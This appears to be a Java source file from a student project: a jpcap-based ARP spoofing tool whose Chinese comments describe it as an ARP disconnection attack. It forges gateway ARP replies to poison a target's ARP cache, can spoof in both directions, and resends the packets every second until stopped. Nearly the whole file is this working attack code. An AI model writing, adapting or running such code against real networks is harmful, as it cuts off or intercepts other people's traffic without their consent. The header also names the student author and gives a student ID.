package software.service;

import javafx.scene.control.TableView;
import javafx.scene.control.TextField;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import software.beans.property.HostInfoTableData;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

import static software.service.NICService.device;
import static software.utils.NetUtil.strToMac;

/**
 * 执行ARP攻击类。需要单独设置一个线程
 *
 * @author 侯心怡
 * @class 软信1902
 * @StudentID 20195782
 * @date 2022-03-06
 */
public class ARPService implements Runnable {
    private boolean threadStop = false;
    private boolean ifTwoWay = false; //是否双向欺骗
    private String desIP;
    private String srcIP;
    private String srcMAC;
    private String attIP;
    private NetworkInterface device;

    public void setNetworkInterface(NetworkInterface networkInterface) {
        this.device = networkInterface;
    }

    public void setDesIP(String desIP) {
        this.desIP = desIP;
    }

    public void setSrcIP(String srcIP) {
        this.srcIP = srcIP;
    }

    public void setSrcMAC(String srcMAC) {
        this.srcMAC = srcMAC;
    }

    public void setAttIP(String attIP) {
        this.attIP = attIP;
    }

    public void setThreadStop(boolean threadStop) {
        this.threadStop = threadStop;
    }

    public void setIfTwoWay(boolean ifTwoWay) {
        this.ifTwoWay = ifTwoWay;
    }


    /**
     * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
     *
     * @param desIP //未知MAC地址主机的IP地址
     * @return //已知IP地址的MAC地址
     */

    public byte[] getOtherMAC(String desIP, String attIP) throws IOException {
        JpcapCaptor jc = JpcapCaptor.openDevice(device, 2000, false, 3000); //打开网络设备，用来侦听
        JpcapSender sender = jc.getJpcapSenderInstance();     //发送器JpcapSender，用来发送报文
        InetAddress senderIP = InetAddress.getByName(attIP);  //设置本地主机的IP地址，方便接收对方返回的报文(攻击方) 192.168.134.1
        InetAddress targetIP = InetAddress.getByName(desIP);  //目标主机的IP地址

        ARPPacket arp = new ARPPacket();           //开始构造一个ARP包
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;   //硬件类型
        arp.prototype = ARPPacket.PROTOTYPE_IP;    //协议类型
        arp.operation = ARPPacket.ARP_REQUEST;     //指明是ARP请求包
        arp.hlen = 6;                              //物理地址长度
        arp.plen = 4;                              //协议地址长度

        arp.sender_hardaddr = device.mac_address;       //ARP包的发送端以太网地址,在这里即本地主机地址
        arp.sender_protoaddr = senderIP.getAddress();   //发送端IP地址, 在这里即本地IP地址
        byte[] broadcast = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255}; //广播地址
        arp.target_hardaddr = broadcast;                //设置目的端的以太网地址为广播地址
        arp.target_protoaddr = targetIP.getAddress();   //目的端IP地址

        /* 构造以太帧首部 */
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP; //帧类型
        ether.src_mac = device.mac_address;             //源MAC地址
        ether.dst_mac = broadcast;                      //以太网目的地址，广播地址
        arp.datalink = ether;                           //将arp报文的数据链路层的帧设置为刚刚构造的以太帧
        sender.sendPacket(arp);                         //发送ARP报文

        /* 获取ARP回复包，从中提取出目的主机的MAC地址，如果返回的是网关地址，表明目的IP不是局域网内的地址 */
        while (true) {
            Packet packet = jc.getPacket();
            if (packet instanceof ARPPacket) {
                ARPPacket p = (ARPPacket) packet;
                if (Arrays.equals(p.target_protoaddr, senderIP.getAddress())) {
                    System.out.println("get mac ok");
                    return p.sender_hardaddr; //返回
                }
            }
        }
    }


    /**
     * 执行ARP断网攻击。
     * 原理是：冒充网关发送出来的ARP应答包，令接收端更改其ARP缓存表，修改网关IP地址对应的MAC地址，从而令数据无法正常通过网关发出。
     * <p>
     * 此处设置一个线程，当点击"开始"按钮时候，会启动此线程
     */

    @Override
    public void run() {
        while (true) {
            try {
                JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535,
                        false, 3000);
                jpcap.setFilter("arp", true);
                JpcapSender sender = JpcapSender.openDevice(device);
                ARPPacket arp = new ARPPacket();
                ARPPacket arp2 = new ARPPacket();
                arp.hardtype = ARPPacket.HARDTYPE_ETHER;  //硬件类型
                arp.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
                arp.operation = ARPPacket.ARP_REPLY;      //指明是ARP应答包
                arp.hlen = 6;
                arp.plen = 4;

                byte[] srcmac = strToMac(srcMAC);         // 伪装的MAC地址，可随意填写
                arp.sender_hardaddr = srcmac;
                arp.sender_protoaddr = InetAddress.getByName(srcIP).getAddress();  //192.168.134.2断网；
                arp.target_hardaddr = getOtherMAC(desIP, attIP);
                arp.target_protoaddr = InetAddress.getByName(desIP).getAddress();

                /* 设置数据链路层的帧 */
                EthernetPacket ether = new EthernetPacket();
                ether.frametype = EthernetPacket.ETHERTYPE_ARP;
                ether.src_mac = srcmac;                   //停止攻击一段时间后，目标主机会自动恢复网络。
                ether.dst_mac = getOtherMAC(desIP, attIP);
                arp.datalink = ether;

                /*双向欺骗*/
                if (ifTwoWay) {
                    arp2.hardtype = ARPPacket.HARDTYPE_ETHER;  //硬件类型
                    arp2.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
                    arp2.operation = ARPPacket.ARP_REPLY;      //指明是ARP应答包包
                    arp2.hlen = 6;
                    arp2.plen = 4;

                    arp2.sender_hardaddr = srcmac;
                    arp2.sender_protoaddr = InetAddress.getByName(desIP).getAddress();  //192.168.134.2断网；
                    arp2.target_hardaddr = getOtherMAC(srcIP, attIP);
                    arp2.target_protoaddr = InetAddress.getByName(srcIP).getAddress();


                    /* 设置数据链路层的帧 */
                    EthernetPacket ether2 = new EthernetPacket();
                    ether2.frametype = EthernetPacket.ETHERTYPE_ARP;
                    ether2.src_mac = srcmac;                   //停止攻击一段时间后，目标主机会自动恢复网络。
                    ether2.dst_mac = getOtherMAC(srcIP, attIP);
                    arp2.datalink = ether2;

                }

                /*  发送ARP应答包。因为一般主机会间隔一定时间发送ARP请求包询问网关地址，所以这里需要设置一个攻击周期。*/
                do {
                    System.out.println("sending ARP packet……");
                    sender.sendPacket(arp);
                    if (ifTwoWay) sender.sendPacket(arp2);
                    Thread.sleep(1000);  //设置攻击周期为1秒
                } while (!threadStop);
            } catch (InterruptedException | IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 获取对应行的IP
     */
    public void getHostIP(TextField tf_desIP, TableView<HostInfoTableData> tableView) {

        tableView.getSelectionModel().selectedItemProperty().addListener(
                (observable, oldValue, newValue) -> tf_desIP.setText(newValue.getHostIP())
        );
    }
}
